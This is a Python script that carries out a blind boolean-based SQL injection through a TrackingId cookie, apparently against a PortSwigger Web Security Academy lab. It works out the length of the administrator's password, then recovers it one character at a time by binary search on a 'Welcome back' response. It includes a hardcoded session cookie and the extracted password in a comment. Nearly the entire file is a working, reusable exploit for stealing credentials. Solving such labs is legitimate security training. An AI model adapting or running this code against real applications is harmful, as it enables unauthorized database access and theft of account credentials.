import requests
requests.packages.urllib3.disable_warnings()

url='https://0a88005f0325056281b0072e00a701cc.web-security-academy.net/'

def head(payload):
    return {'Cookie':f"TrackingId=lRT2iLPQwEOZ8sm8' {payload}-- ; session=v2xsJ9XCOtopOwQ4QEaMQaZYuVKPWZv0"}

def f1(payload):
    headers=head(payload)
    res=requests.get(url,headers=headers,allow_redirects=False,verify=False)
    if 'Welcome back' in res.text:
        return True
    else:
        return False

def f2(idx,c,com):
    # index,character,compare
    # payload means that the character at index of password `compare` with character called `c`
    payload=f"AND (SELECT SUBSTRING(password,{idx},1) FROM users WHERE username='administrator'){com}'{c}'"
    headers=head(payload)
    res=requests.get(url,headers=headers,allow_redirects=False,verify=False)
    if 'Welcome back' in res.text:
        print('YESSSS',c,headers)
        return True
    else:
        print('NOOOOO',c,headers)
        return False

sz=0

# calc the length of password to sz
for i in range(1,50):
    if f1(f"AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)={i})='a'"):
        print('Len is', i, 'right')
        sz=i
        break
    else:
        print('Len is', i, 'fake')

# after calc sz is 20

# calc the character at index of password
def f3(idx,l,r,is_chr):
    def get(num):
        return chr(num) if is_chr else str(num)
    while l<r:
        mid=(l+r)//2
        c=get(mid)
        if f2(idx,c,'>'):
            l=mid+1
        else:
            r=mid
    assert(f2(idx,get(l),'='))
    return get(l)

ans=''
for i in range(1,21):
    if f2(i,'a','>='):
        # only lowercase
        ans+=f3(i,ord('a'),ord('z')+1,True)
    else:
        # only digits
        ans+=f3(i,0,10,False)
    print('CURRRRRR ANSSS',ans)
# CURRRRRR ANSSS 9mmh4ykjckkn2wb8wb44
